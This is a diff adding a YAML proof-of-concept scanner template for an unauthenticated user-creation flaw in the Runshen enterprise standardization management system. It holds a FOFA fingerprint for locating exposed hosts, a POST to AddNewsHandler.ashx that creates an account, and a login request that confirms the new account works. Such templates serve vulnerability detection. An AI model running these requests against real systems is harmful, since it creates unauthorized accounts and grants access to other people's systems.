@@ -1,0 +1,28 @@
+id: poc-yaml-rainsome-pdca-addnewshandler-ashx-adduser
+info:
+  name: 润申科技企业标准化管理系统AddNewsHandler.ashx 任意用户创建
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: 企业标准化管理系统
+  fofa: PDCA/js/_publicCom.js
+variables:
+  user: random_str(10)
+  pass: random_str(10)
+  r3: urlencode(base64(user))
+  r4: urlencode(base64(pass))
+requests:
+- method: POST
+  path: /PDCA/ashx/AddNewsHandler.ashx?action=Adduser
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: username={{.user}}&pwd={{.pass}}&savedays=1
+  expression: status_code == 200 && body == "1"
+- method: POST
+  path: /ashx/loginhandler.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    X-Requested-With: XMLHttpRequest
+  data: username={{.r3}}&password={{.r4}}&savedays=MQ%3D%3D
+  expression: status_code == 200 && body == "{\"success\":true,\"message\":\"ok\"}"
+transport: http
